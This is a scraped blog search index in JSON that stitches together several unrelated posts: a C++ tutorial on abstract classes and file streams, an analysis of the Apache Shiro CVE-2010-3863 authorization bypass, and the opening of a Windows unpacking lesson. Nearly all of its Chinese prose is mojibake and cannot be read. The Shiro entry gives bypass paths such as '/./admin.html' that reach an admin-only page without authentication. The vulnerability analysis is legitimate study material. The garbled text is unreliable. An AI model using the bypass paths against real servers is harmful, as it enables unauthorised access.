NULL;\n\t\t&#125;\n\n\t\t&#x2F;&#x2F;é‡Šæ”¾æ˜¾å¡é›¶ä»¶\n\t\tif (m_vc !&#x3D; NULL)\n\t\t&#123;\n\t\t\tdelete m_vc;\n\t\t\tm_vc &#x3D; NULL;\n\t\t&#125;\n\n\t\t&#x2F;&#x2F;é‡Šæ”¾å†…å­˜æ¡é›¶ä»¶\n\t\tif (m_mem !&#x3D; NULL)\n\t\t&#123;\n\t\t\tdelete m_mem;\n\t\t\tm_mem &#x3D; NULL;\n\t\t&#125;\n\t&#125;\n\nprivate:\n\n\tCPU * m_cpu; &#x2F;&#x2F;CPUçš„é›¶ä»¶æŒ‡é’ˆ\n\tVideoCard * m_vc; &#x2F;&#x2F;æ˜¾å¡é›¶ä»¶æŒ‡é’ˆ\n\tMemory * m_mem; &#x2F;&#x2F;å†…å­˜æ¡é›¶ä»¶æŒ‡é’ˆ\n&#125;;\n\n&#x2F;&#x2F;å…·ä½“å‚å•†\n&#x2F;&#x2F;Intelå‚å•†\nclass IntelCPU :public CPU\n&#123;\npublic:\n\tvirtual void calculate()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Intelçš„CPUå¼€å§‹è®¡ç®—äº†ï¼&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n\nclass IntelVideoCard :public VideoCard\n&#123;\npublic:\n\tvirtual void display()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Intelçš„æ˜¾å¡å¼€å§‹æ˜¾ç¤ºäº†ï¼&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n\nclass IntelMemory :public Memory\n&#123;\npublic:\n\tvirtual void storage()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Intelçš„å†…å­˜æ¡å¼€å§‹å­˜å‚¨äº†ï¼&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n\n&#x2F;&#x2F;Lenovoå‚å•†\nclass LenovoCPU :public CPU\n&#123;\npublic:\n\tvirtual void calculate()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Lenovoçš„CPUå¼€å§‹è®¡ç®—äº†ï¼&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n\nclass LenovoVideoCard :public VideoCard\n&#123;\npublic:\n\tvirtual void display()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Lenovoçš„æ˜¾å¡å¼€å§‹æ˜¾ç¤ºäº†ï¼&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n\nclass LenovoMemory :public Memory\n&#123;\npublic:\n\tvirtual void storage()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Lenovoçš„å†…å­˜æ¡å¼€å§‹å­˜å‚¨äº†ï¼&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n\n\nvoid test01()\n&#123;\n\t&#x2F;&#x2F;ç¬¬ä¸€å°ç”µè„‘é›¶ä»¶\n\tCPU * intelCpu &#x3D; new IntelCPU;\n\tVideoCard * intelCard &#x3D; new IntelVideoCard;\n\tMemory * intelMem &#x3D; new IntelMemory;\n\n\tcout &lt;&lt; &quot;ç¬¬ä¸€å°ç”µè„‘å¼€å§‹å·¥ä½œï¼š&quot; &lt;&lt; endl;\n\t&#x2F;&#x2F;åˆ›å»ºç¬¬ä¸€å°ç”µè„‘\n\tComputer * computer1 &#x3D; new Computer(intelCpu, intelCard, intelMem);\n\tcomputer1-&gt;work();\n\tdelete computer1;\n\n\tcout &lt;&lt; &quot;-----------------------&quot; &lt;&lt; endl;\n\tcout &lt;&lt; &quot;ç¬¬äºŒå°ç”µè„‘å¼€å§‹å·¥ä½œï¼š&quot; &lt;&lt; endl;\n\t&#x2F;&#x2F;ç¬¬äºŒå°ç”µè„‘ç»„è£…\n\tComputer * computer2 &#x3D; new Computer(new LenovoCPU, new LenovoVideoCard, new LenovoMemory);;\n\tcomputer2-&gt;work();\n\tdelete computer2;\n\n\tcout &lt;&lt; &quot;-----------------------&quot; &lt;&lt; endl;\n\tcout &lt;&lt; &quot;ç¬¬ä¸‰å°ç”µè„‘å¼€å§‹å·¥ä½œï¼š&quot; &lt;&lt; endl;\n\t&#x2F;&#x2F;ç¬¬ä¸‰å°ç”µè„‘ç»„è£…\n\tComputer * computer3 &#x3D; new Computer(new LenovoCPU, new IntelVideoCard, new LenovoMemory);;\n\tcomputer3-&gt;work();\n\tdelete computer3;\n\n&#125;\n\næ–‡ä»¶æ“ä½œç¨‹åºè¿è¡Œæ—¶äº§ç”Ÿçš„æ•°æ®éƒ½å±äºä¸´æ—¶æ•°æ®ï¼Œç¨‹åºä¸€æ—¦è¿è¡Œç»“æŸéƒ½ä¼šè¢«é‡Šæ”¾\né€šè¿‡æ–‡ä»¶å¯ä»¥å°†æ•°æ®æŒä¹…åŒ–\nC++ä¸­å¯¹æ–‡ä»¶æ“ä½œéœ€è¦åŒ…å«å¤´æ–‡ä»¶ &#x3D;&#x3D;&lt; fstream &gt;&#x3D;&#x3D;\næ–‡ä»¶ç±»å‹åˆ†ä¸ºä¸¤ç§ï¼š\n\næ–‡æœ¬æ–‡ä»¶ - æ–‡ä»¶ä»¥æ–‡æœ¬çš„ASCIIç å½¢å¼å­˜å‚¨åœ¨è®¡ç®—æœºä¸­\näºŒè¿›åˆ¶æ–‡ä»¶ - æ–‡ä»¶ä»¥æ–‡æœ¬çš„äºŒè¿›åˆ¶å½¢å¼å­˜å‚¨åœ¨è®¡ç®—æœºä¸­ï¼Œç”¨æˆ·ä¸€èˆ¬ä¸èƒ½ç›´æ¥è¯»æ‡‚å®ƒä»¬\n\næ“ä½œæ–‡ä»¶çš„ä¸‰å¤§ç±»:\n\nofstreamï¼šå†™æ“ä½œ\nifstreamï¼š è¯»æ“ä½œ\nfstream ï¼š è¯»å†™æ“ä½œ\n\næ–‡æœ¬æ–‡ä»¶å†™æ–‡ä»¶å†™æ–‡ä»¶æ­¥éª¤å¦‚ä¸‹ï¼š\n\nåŒ…å«å¤´æ–‡ä»¶\n#include\n\nåˆ›å»ºæµå¯¹è±¡\nofstream ofs;\n\næ‰“å¼€æ–‡ä»¶\nofs.open(â€œæ–‡ä»¶è·¯å¾„â€,æ‰“å¼€æ–¹å¼);\n\nå†™æ•°æ®\nofs &lt;&lt; â€œå†™å…¥çš„æ•°æ®â€;\n\nå…³é—­æ–‡ä»¶\nofs.close();\n\n\næ–‡ä»¶æ‰“å¼€æ–¹å¼ï¼š\n\n\n\næ‰“å¼€æ–¹å¼\nè§£é‡Š\n\n\n\nios::in\nä¸ºè¯»æ–‡ä»¶è€Œæ‰“å¼€æ–‡ä»¶\n\n\nios::out\nä¸ºå†™æ–‡ä»¶è€Œæ‰“å¼€æ–‡ä»¶\n\n\nios::ate\nåˆå§‹ä½ç½®ï¼šæ–‡ä»¶å°¾\n\n\nios::app\nè¿½åŠ æ–¹å¼å†™æ–‡ä»¶\n\n\nios::trunc\nå¦‚æœæ–‡ä»¶å­˜åœ¨å…ˆåˆ é™¤ï¼Œå†åˆ›å»º\n\n\nios::binary\näºŒè¿›åˆ¶æ–¹å¼\n\n\næ³¨æ„ï¼š æ–‡ä»¶æ‰“å¼€æ–¹å¼å¯ä»¥é…åˆä½¿ç”¨ï¼Œåˆ©ç”¨|æ“ä½œç¬¦\nä¾‹å¦‚ï¼šç”¨äºŒè¿›åˆ¶æ–¹å¼å†™æ–‡ä»¶ ios::binary | ios:: out\nç¤ºä¾‹ï¼š\n#include &lt;fstream&gt;\n\nvoid test01()\n&#123;\n\tofstream ofs;\n\tofs.open(&quot;test.txt&quot;, ios::out);\n\n\tofs &lt;&lt; &quot;å§“åï¼šå¼ ä¸‰&quot; &lt;&lt; endl;\n\tofs &lt;&lt; &quot;æ€§åˆ«ï¼šç”·&quot; &lt;&lt; endl;\n\tofs &lt;&lt; &quot;å¹´é¾„ï¼š18&quot; &lt;&lt; endl;\n\n\tofs.close();\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\næ€»ç»“ï¼š\n\næ–‡ä»¶æ“ä½œå¿…é¡»åŒ…å«å¤´æ–‡ä»¶ fstream\nè¯»æ–‡ä»¶å¯ä»¥åˆ©ç”¨ ofstream ï¼Œæˆ–è€…fstreamç±»\næ‰“å¼€æ–‡ä»¶æ—¶å€™éœ€è¦æŒ‡å®šæ“ä½œæ–‡ä»¶çš„è·¯å¾„ï¼Œä»¥åŠæ‰“å¼€æ–¹å¼\nåˆ©ç”¨&lt;&lt;å¯ä»¥å‘æ–‡ä»¶ä¸­å†™æ•°æ®\næ“ä½œå®Œæ¯•ï¼Œè¦å…³é—­æ–‡ä»¶\n\nè¯»æ–‡ä»¶è¯»æ–‡ä»¶ä¸å†™æ–‡ä»¶æ­¥éª¤ç›¸ä¼¼ï¼Œä½†æ˜¯è¯»å–æ–¹å¼ç›¸å¯¹äºæ¯”è¾ƒå¤š\nè¯»æ–‡ä»¶æ­¥éª¤å¦‚ä¸‹ï¼š\n\nåŒ…å«å¤´æ–‡ä»¶\n#include\n\nåˆ›å»ºæµå¯¹è±¡\nifstream ifs;\n\næ‰“å¼€æ–‡ä»¶å¹¶åˆ¤æ–­æ–‡ä»¶æ˜¯å¦æ‰“å¼€æˆåŠŸ\nifs.open(â€œæ–‡ä»¶è·¯å¾„â€,æ‰“å¼€æ–¹å¼);\n\nè¯»æ•°æ®\nå››ç§æ–¹å¼è¯»å–\n\nå…³é—­æ–‡ä»¶\nifs.close();\n\n\nç¤ºä¾‹ï¼š\n#include &lt;fstream&gt;\n#include &lt;string&gt;\nvoid test01()\n&#123;\n\tifstream ifs;\n\tifs.open(&quot;test.txt&quot;, ios::in);\n\n\tif (!ifs.is_open())\n\t&#123;\n\t\tcout &lt;&lt; &quot;æ–‡ä»¶æ‰“å¼€å¤±è´¥&quot; &lt;&lt; endl;\n\t\treturn;\n\t&#125;\n\n\t&#x2F;&#x2F;ç¬¬ä¸€ç§æ–¹å¼\n\t&#x2F;&#x2F;char buf[1024] &#x3D; &#123; 0 &#125;;\n\t&#x2F;&#x2F;while (ifs &gt;&gt; buf)\n\t&#x2F;&#x2F;&#123;\n\t&#x2F;&#x2F;\tcout &lt;&lt; buf &lt;&lt; endl;\n\t&#x2F;&#x2F;&#125;\n\n\t&#x2F;&#x2F;ç¬¬äºŒç§\n\t&#x2F;&#x2F;char buf[1024] &#x3D; &#123; 0 &#125;;\n\t&#x2F;&#x2F;while (ifs.getline(buf,sizeof(buf)))\n\t&#x2F;&#x2F;&#123;\n\t&#x2F;&#x2F;\tcout &lt;&lt; buf &lt;&lt; endl;\n\t&#x2F;&#x2F;&#125;\n\n\t&#x2F;&#x2F;ç¬¬ä¸‰ç§\n\t&#x2F;&#x2F;string buf;\n\t&#x2F;&#x2F;while (getline(ifs, buf))\n\t&#x2F;&#x2F;&#123;\n\t&#x2F;&#x2F;\tcout &lt;&lt; buf &lt;&lt; endl;\n\t&#x2F;&#x2F;&#125;\n\n\tchar c;\n\twhile ((c &#x3D; ifs.get()) !&#x3D; EOF)\n\t&#123;\n\t\tcout &lt;&lt; c;\n\t&#125;\n\n\tifs.close();\n\n\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\næ€»ç»“ï¼š\n\nè¯»æ–‡ä»¶å¯ä»¥åˆ©ç”¨ ifstream ï¼Œæˆ–è€…fstreamç±»\nåˆ©ç”¨is_openå‡½æ•°å¯ä»¥åˆ¤æ–­æ–‡ä»¶æ˜¯å¦æ‰“å¼€æˆåŠŸ\nclose å…³é—­æ–‡ä»¶\n\näºŒè¿›åˆ¶æ–‡ä»¶ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼å¯¹æ–‡ä»¶è¿›è¡Œè¯»å†™æ“ä½œ\næ‰“å¼€æ–¹å¼è¦æŒ‡å®šä¸º &#x3D;&#x3D;ios::binary&#x3D;&#x3D;\nå†™æ–‡ä»¶äºŒè¿›åˆ¶æ–¹å¼å†™æ–‡ä»¶ä¸»è¦åˆ©ç”¨æµå¯¹è±¡è°ƒç”¨æˆå‘˜å‡½æ•°write\nå‡½æ•°åŸå‹ ï¼šostream&amp; write(const char * buffer,int len);\nå‚æ•°è§£é‡Šï¼šå­—ç¬¦æŒ‡é’ˆbufferæŒ‡å‘å†…å­˜ä¸­ä¸€æ®µå­˜å‚¨ç©ºé—´ã€‚lenæ˜¯è¯»å†™çš„å­—èŠ‚æ•°\nç¤ºä¾‹ï¼š\n#include &lt;fstream&gt;\n#include &lt;string&gt;\n\nclass Person\n&#123;\npublic:\n\tchar m_Name[64];\n\tint m_Age;\n&#125;;\n\n&#x2F;&#x2F;äºŒè¿›åˆ¶æ–‡ä»¶  å†™æ–‡ä»¶\nvoid test01()\n&#123;\n\t&#x2F;&#x2F;1ã€åŒ…å«å¤´æ–‡ä»¶\n\n\t&#x2F;&#x2F;2ã€åˆ›å»ºè¾“å‡ºæµå¯¹è±¡\n\tofstream ofs(&quot;person.txt&quot;, ios::out | ios::binary);\n\t\n\t&#x2F;&#x2F;3ã€æ‰“å¼€æ–‡ä»¶\n\t&#x2F;&#x2F;ofs.open(&quot;person.txt&quot;, ios::out | ios::binary);\n\n\tPerson p &#x3D; &#123;&quot;å¼ ä¸‰&quot;  , 18&#125;;\n\n\t&#x2F;&#x2F;4ã€å†™æ–‡ä»¶\n\tofs.write((const char *)&amp;p, sizeof(p));\n\n\t&#x2F;&#x2F;5ã€å…³é—­æ–‡ä»¶\n\tofs.close();\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\næ€»ç»“ï¼š\n\næ–‡ä»¶è¾“å‡ºæµå¯¹è±¡ å¯ä»¥é€šè¿‡writeå‡½æ•°ï¼Œä»¥äºŒè¿›åˆ¶æ–¹å¼å†™æ•°æ®\n\nè¯»æ–‡ä»¶äºŒè¿›åˆ¶æ–¹å¼è¯»æ–‡ä»¶ä¸»è¦åˆ©ç”¨æµå¯¹è±¡è°ƒç”¨æˆå‘˜å‡½æ•°read\nå‡½æ•°åŸå‹ï¼šistream&amp; read(char *buffer,int len);\nå‚æ•°è§£é‡Šï¼šå­—ç¬¦æŒ‡é’ˆbufferæŒ‡å‘å†…å­˜ä¸­ä¸€æ®µå­˜å‚¨ç©ºé—´ã€‚lenæ˜¯è¯»å†™çš„å­—èŠ‚æ•°\nç¤ºä¾‹ï¼š\n#include &lt;fstream&gt;\n#include &lt;string&gt;\n\nclass Person\n&#123;\npublic:\n\tchar m_Name[64];\n\tint m_Age;\n&#125;;\n\nvoid test01()\n&#123;\n\tifstream ifs(&quot;person.txt&quot;, ios::in | ios::binary);\n\tif (!ifs.is_open())\n\t&#123;\n\t\tcout &lt;&lt; &quot;æ–‡ä»¶æ‰“å¼€å¤±è´¥&quot; &lt;&lt; endl;\n\t&#125;\n\n\tPerson p;\n\tifs.read((char *)&amp;p, sizeof(p));\n\n\tcout &lt;&lt; &quot;å§“åï¼š &quot; &lt;&lt; p.m_Name &lt;&lt; &quot; å¹´é¾„ï¼š &quot; &lt;&lt; p.m_Age &lt;&lt; endl;\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n\næ–‡ä»¶è¾“å…¥æµå¯¹è±¡ å¯ä»¥é€šè¿‡readå‡½æ•°ï¼Œä»¥äºŒè¿›åˆ¶æ–¹å¼è¯»æ•°æ®\n\n\n\n\n\n\n\n\n\n\næ³¨æ˜ï¼šæœ¬æ–‡æ¥è‡ªhttps://github.com/AnkerLeng/Cpp-0-1-Resource\n","slug":"C++æ ¸å¿ƒç¼–ç¨‹","date":"2020-11-21T12:53:51.000Z","categories_index":"C/C++","tags_index":"C/C++åŸºç¡€","author_index":"Akpigs"},{"id":"897e4bf7aafe9ea58ed211d851b9242c","title":"CVE-2010-3863æƒé™ç»•è¿‡åˆ†æ","content":"\n\n\n\n\n\n\n\n\næ—…è¡Œè€…,æœ¬ç ´ç«™ç‚¹æ—¨åœ¨åŸåˆ›æ–‡ç« è®°å½•å­¦ä¹ ç»å†&amp;&amp;æ”¶é›†ä¼˜ç§€èµ„æºå‡å°‘å­¦ä¹ æˆæœ¬ï¼Œå¦‚æœæ‚¨åˆæ›´å¥½çš„æƒ³æ³•è¯·è”ç³»æˆ‘ã€‚è®©æˆ‘ä»¬ä¸€èµ·ä¼ æ‰¿å¼€æºç²¾ç¥ğŸ¤“â€¦â€¦\nCVE-2010-3863æƒé™ç»•è¿‡åˆ†æåˆè¯†shiro\n\n\n\n\n\n\n\n\nApache Shiroâ„¢æ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§ä¸”æ˜“äºä½¿ç”¨çš„ Java å®‰å…¨æ¡†æ¶ï¼Œå®ƒæ‰§è¡Œèº«ä»½éªŒè¯ã€æˆæƒã€åŠ å¯†å’Œä¼šè¯ç®¡ç†ã€‚å€ŸåŠ© Shiro æ˜“äºç†è§£çš„ APIï¼Œæ‚¨å¯ä»¥å¿«é€Ÿè½»æ¾åœ°ä¿æŠ¤ä»»ä½•åº”ç”¨ç¨‹åºâ€”â€”ä»æœ€å°çš„ç§»åŠ¨åº”ç”¨ç¨‹åºåˆ°æœ€å¤§çš„ Web å’Œä¼ä¸šåº”ç”¨ç¨‹åºã€‚\nä»å®˜æ–¹ç®€ä»‹ä¸­å¯ä»¥å¾—çŸ¥ shiro æ˜¯ä¸€å¥—æƒé™ç®¡ç†æ¡†æ¶ï¼Œåœ¨ shiro æ¡†æ¶ä¸­æœ‰ä»¥ä¸‹ä¸‰ä¸ªæ ¸å¿ƒæ¦‚å¿µæ¨¡å—ï¼šSubjectã€SecurityMangerå’ŒRealms\n\nSubjectï¼šå½“å‰æ­£åœ¨æ‰§è¡Œçš„ç”¨æˆ·\nSecurityMangerï¼šå®‰å…¨ç®¡ç†å™¨ï¼Œç®¡ç†æ‰€æœ‰ç”¨æˆ·çš„æ“ä½œï¼Œæ˜¯ shiro æ¶æ„çš„æ ¸å¿ƒ\nRealmï¼šå°è£…æ•°æ®æºï¼Œå……å½“ shiro ä¸åº”ç”¨ç¨‹åºå®‰å…¨æ•°æ®ä¹‹é—´çš„æ¡¥æ¢ï¼Œå½“éœ€è¦ä¸å®‰å…¨ç›¸å…³çš„æ•°æ®(å¦‚ç”¨æˆ·å¸æˆ·)è¿›è¡Œå®é™…äº¤äº’ä»¥æ‰§è¡Œèº«ä»½éªŒè¯(ç™»å½•)å’Œæˆæƒ(è®¿é—®æ§åˆ¶)æ—¶ï¼Œä¸ºå…¶æä¾›èº«ä»½éªŒè¯æˆ–è€…æˆæƒã€‚\n\nå› æ­¤ä¸€æ¬¡ è¯·æ±‚â€“&gt; è®¤è¯ â€“&gt; æˆæƒçš„æµç¨‹ä¸ºï¼š\n\nweb åº”ç”¨ç¨‹åºè·å–å½“å‰çš„Subjectå¹¶è°ƒç”¨è¯¥Subjectçš„æ ¡éªŒæ–¹æ³•ï¼›\nSubjectä¼ é€’æ ¡éªŒåˆ°SecurityMangerè¿›è¡Œå¤„ç†å¹¶è¿›è¡Œåˆ¤æ–­ï¼›\nSecurityMangerè°ƒç”¨Realmè·å–é…ç½®ä¿¡æ¯ï¼Œé€šè¿‡è¯¥é…ç½®ä¿¡æ¯åˆ¤æ–­å½“å‰çš„Subjectæ‰€å±è§’è‰²æ˜¯å¦èƒ½å¤Ÿè¿›è¡Œæ“ä½œã€‚\n\næ¼æ´ç¯å¢ƒè¯¥æ¼æ´ç¯å¢ƒå·²ç»ä¸Šä¼ åˆ° github ä»“åº“ä¸Šï¼šhttps://github.com/dota-st/vulnEnv\né¦–å…ˆåœ¨é…ç½®æ–‡ä»¶realm.iniä¸­å®šä¹‰äº†ç”¨æˆ·è´¦å·å¯†ç ä»¥åŠå¯¹åº”è§’è‰²æƒé™\nShiroConfig\n@Configuration\npublic class ShiroConfig &#123;\n\n    @Bean\n    public IniRealm getIniRealm()&#123;\n        return new IniRealm(&quot;classpath:realm.ini&quot;);\n    &#125;\n\n    @Bean\n    public DefaultWebSecurityManager getDefaultWebSecurityManager(Realm realm)&#123;\n        return new DefaultWebSecurityManager(realm);\n    &#125;\n\n\n    &#x2F;*\n     * anonï¼šæ— éœ€è®¤è¯å°±å¯ä»¥è®¿é—®\n     * authcï¼šå¿…é¡»è®¤è¯æ‰èƒ½è®¿é—®\n     * userï¼šå¿…é¡»æ‹¥æœ‰è®°ä½æˆ‘åŠŸèƒ½æ‰èƒ½è®¿é—®\n     * permsï¼šæ‹¥æœ‰æŸä¸ªèµ„æºçš„æƒé™æ‰èƒ½è®¿é—®\n     * roleï¼šæ‹¥æœ‰æŸä¸ªè§’è‰²çš„æƒé™æ‰èƒ½è®¿é—®\n     * *&#x2F;\n    @Bean\n    ShiroFilterFactoryBean getShiroFilterFactoryBean(DefaultWebSecurityManager defaultWebSecurityManager) &#123;\n        ShiroFilterFactoryBean bean &#x3D; new ShiroFilterFactoryBean();\n        bean.setSecurityManager(defaultWebSecurityManager);\n        bean.setLoginUrl(&quot;&#x2F;login.html&quot;);\n        LinkedHashMap&lt;String, String&gt; map &#x3D; new LinkedHashMap&lt;String, String&gt;();\n        map.put(&quot;&#x2F;admin.html&quot;, &quot;authc, roles[admin]&quot;);\n        map.put(&quot;&#x2F;user.html&quot;, &quot;authc, roles[user]&quot;);\n        map.put(&quot;&#x2F;**&quot;, &quot;anon&quot;);\n        bean.setFilterChainDefinitionMap(map);\n        return bean;\n    &#125;\n&#125;\n\nUserController\n@Controller\npublic class UserController &#123;\n\n    @PostMapping(&quot;&#x2F;doLogin&quot;)\n    public String doLoginPage(@RequestParam(&quot;username&quot;) String username, @RequestParam(&quot;password&quot;) String password, @RequestParam(name&#x3D;&quot;rememberme&quot;, defaultValue&#x3D;&quot;&quot;) String rememberMe)&#123;\n        if(ShiroUtil.login(username, password))&#123;\n            if(ShiroUtil.hasRole(&quot;admin&quot;))&#123;\n                return &quot;redirect:&#x2F;admin.html&quot;;\n            &#125; else if (ShiroUtil.hasRole(&quot;user&quot;)) &#123;\n                return &quot;redirect:&#x2F;user.html&quot;;\n            &#125;\n        &#125;\n        return &quot;redirect:&#x2F;unauth.html&quot;;\n    &#125;\n\n    @RequestMapping(value&#x3D;&#123;&quot;&#x2F;&quot;&#125;)\n    public String helloPage() throws Exception &#123;\n\n        return &quot;redirect:&#x2F;login.html&quot;;\n    &#125;\n&#125;\n\næ¼æ´åˆ†æå½±å“ç‰ˆæœ¬ï¼šshiro &lt; 1.1.0\nshiro ä½¿ç”¨org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain()æ–¹æ³•è·å–å’Œè°ƒç”¨æ‰§è¡Œçš„filter\nåœ¨ä¸Šå›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼Œé€šè¿‡getPathWithinApplication()æ–¹æ³•è·å–åˆ°æˆ‘ä»¬ä¼ å…¥çš„è¯·æ±‚è·¯å¾„/./admin.htmlï¼Œæ¥ç€é€šè¿‡filterChainManager.getChainNames()æ–¹æ³•å–å‡ºæˆ‘ä»¬çš„é…ç½®\n[&#x2F;admin.html, &#x2F;user.html, &#x2F;**]\n\næˆ‘ä»¬è¿™é‡Œè·Ÿè¿›ä¸€ä¸‹getPathWithinApplication()æ–¹æ³•\nç»§ç»­è·Ÿè¿›getPathWithinApplication()æ–¹æ³•\nåœ¨getRequestUri()æ–¹æ³•ä¸­è¿”å›äº†/./admin.htmlï¼Œç»§ç»­è·Ÿè¿›getRequestUri()æ–¹æ³•\næœ€åä¼š return åˆ°decodeAndCleanUriString()æ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›è¯¥æ–¹æ³•\né¦–å…ˆå¯¹ URL è¿›è¡Œ URL è§£ç ï¼Œå¹¶å¯¹;è¿›è¡Œæˆªå–ï¼ŒæŸ¥äº†ä¸€ä¸‹\n\n\n\n\n\n\n\n\n\ndecodeAndCleanUriString() æ˜¯ URL Decode åŠé’ˆå¯¹ JBoss&#x2F;Jetty ç­‰ä¸­é—´ä»¶åœ¨ url å¤„æ·»åŠ  ;jsessionid ä¹‹ç±»çš„å­—ç¬¦ä¸²çš„é€‚é…ï¼Œå¯¹ ; è¿›è¡Œäº†æˆªå–ã€‚\næ¥ä¸‹æ¥getChain()æ–¹æ³•å¾€ä¸‹èµ°è¿›è¡Œwhileå¾ªç¯ï¼Œé€šè¿‡pathMatches()-&gt;pathMatcher.matches()æ–¹æ³•è¿›è¡ŒåŒ¹é…\né€šè¿‡å‰é¢å¯¹è¯·æ±‚å¤„ç†çš„è·Ÿè¸ªï¼Œå¯ä»¥å‘ç°åœ¨åŒ¹é…ä¹‹å‰æ²¡æœ‰å¯¹ä¼ è¿›æ¥çš„URLè¿›è¡Œæ ‡å‡†åŒ–è·¯å¾„å¤„ç†ï¼Œå¦‚æœæ„é€ ä¸€ä¸‹è¯·æ±‚è·¯å¾„å°±æœ‰å¯èƒ½ç»•è¿‡æƒé™æ ¡éªŒã€‚\nå›é¡¾ä¸€ä¸‹ï¼Œæˆ‘ä»¬çš„é…ç½®å¦‚ä¸‹æ‰€ç¤ºï¼Œè®¾ç½®admin.htmlæ–‡ä»¶åªæœ‰amdinç”¨æˆ·è§’è‰²æ‰èƒ½è®¿é—®ï¼ŒåŒæ—¶è®¾ç½®/**ä¸ºanon\n@Bean\n    ShiroFilterFactoryBean getShiroFilterFactoryBean(DefaultWebSecurityManager defaultWebSecurityManager) &#123;\n        ShiroFilterFactoryBean bean &#x3D; new ShiroFilterFactoryBean();\n        bean.setSecurityManager(defaultWebSecurityManager);\n        bean.setLoginUrl(&quot;&#x2F;login.html&quot;);\n        LinkedHashMap&lt;String, String&gt; map &#x3D; new LinkedHashMap&lt;String, String&gt;();\n        map.put(&quot;&#x2F;admin.html&quot;, &quot;authc, roles[admin]&quot;);\n        map.put(&quot;&#x2F;user.html&quot;, &quot;authc, roles[user]&quot;);\n        map.put(&quot;&#x2F;**&quot;, &quot;anon&quot;);\n        bean.setFilterChainDefinitionMap(map);\n        return bean;\n    &#125;\n\nè®¿é—®admin.htmlï¼Œå› ä¸ºæ²¡æœ‰adminæƒé™ï¼Œæ ¡éªŒå¤±è´¥æ•… 302 è·³è½¬åˆ°äº†login.html\nè®¿é—®/./admin.htmlæˆ–è€…/aa/../admin.htmlï¼Œåœ¨whileå¾ªç¯ä¸­ï¼Œä¸å‰é¢çš„/admin.htmlå’Œ/user.htmlåŒ¹é…å¤±è´¥ï¼Œè¿›è€Œè¿›å…¥äº†/**çš„åŒ¹é…èŒƒå›´ï¼ŒæˆåŠŸè®¿é—®åˆ°admin.htmlæ–‡ä»¶\n","slug":"CVE-2010-3863","date":"2020-11-09T16:18:15.000Z","categories_index":"Javaå®‰å…¨","tags_index":"Javaå®‰å…¨","author_index":"Akpigs"},{"id":"c389a93a9c4f740048ca4cf923519873","title":"C/C++å¤ä¹ ","content":"\n\n\n\n\n\n\n\n\nhttps://github.com/hugang-first/Cpp-0-1-Resource\n","slug":"C-C-å¤ä¹ ","date":"2020-10-30T15:02:57.000Z","categories_index":"C/C++","tags_index":"C/C++åŸºç¡€","author_index":"Akpigs"},{"id":"d5e1f921b320f1d632be0f3eb7b4b1ce","title":"Windowsè„±å£³-åŸºç¡€","content":"\n\n\n\n\n\n\n\n\næ—…è¡Œè€…,æœ¬ç ´ç«™ç‚¹æ—¨åœ¨åŸåˆ›æ–‡ç« è®°å½•å­¦ä¹ ç»å†&amp;&amp;æ”¶é›†ä¼˜ç§€èµ„æºå‡å°‘å­¦ä¹ æˆæœ¬ï¼Œå¦‚æœæ‚¨åˆæ›´å¥½çš„æƒ³æ³•è¯·è”ç³»æˆ‘ã€‚è®©æˆ‘ä»¬ä¸€èµ·ä¼ æ‰¿å¼€æºç²¾ç¥ğŸ¤“â€¦â€¦\nçŸ¥è¯†ç‚¹å›é¡¾1ã€PEæ–‡ä»¶çš„Magic code(é­”æ•°ã€å¹»æ•°)æ˜¯ä»€ä¹ˆï¼Ÿ\n MZå¤´ã€PEå¤´\n2ã€PEæ–‡ä»¶ä¸­æ–‡ä»¶å¤´çš„ä¿¡æ¯æœ‰å“ªäº›ï¼Ÿ\n è¿è¡Œå¹³å°ã€æ—¶é—´æˆ³ã€PEæ–‡ä»¶å±æ€§ã€åŒºæ®µæ•°é‡ã€æ‰©å±•å¤´çš„å¤§å°\n3ã€PEæ–‡ä»¶ä¸­æ‰©å±•å¤´çš„ä¿¡æ¯æœ‰å“ªäº›ï¼Ÿ\n EPçš„RVAã€ImageBase(400000)ã€ä»£ç æ®µèµ·å§‹åœ°å€ã€æ•°æ®æ®µèµ·å§‹åœ°å€ æ•°æ®ç›®å½•è¡¨ã€æ•°æ®ç›®å½•è¡¨é¡¹æ•°é‡ã€æ–‡ä»¶å¯¹é½ã€å†…å­˜å¯¹é½ã€æ˜ åƒæ€»å¤§å°\n4ã€ PEæ–‡ä»¶ä¸­åŒºæ®µä¿¡æ¯æœ‰å“ªäº›ï¼Ÿ\n åŒºæ®µåç§°ã€è™šæ‹Ÿåœ°å€ã€è™šæ‹Ÿå¤§å°ã€æ–‡ä»¶åç§»ã€æ–‡ä»¶å¤§å°ã€åŒºæ®µå±æ€§(C0000020ã€60000020)\n5ã€PEæ–‡ä»¶ä¸­æ•°æ®ç›®å½•è¡¨æœ‰å“ªäº›è¡¨ï¼Ÿ\n 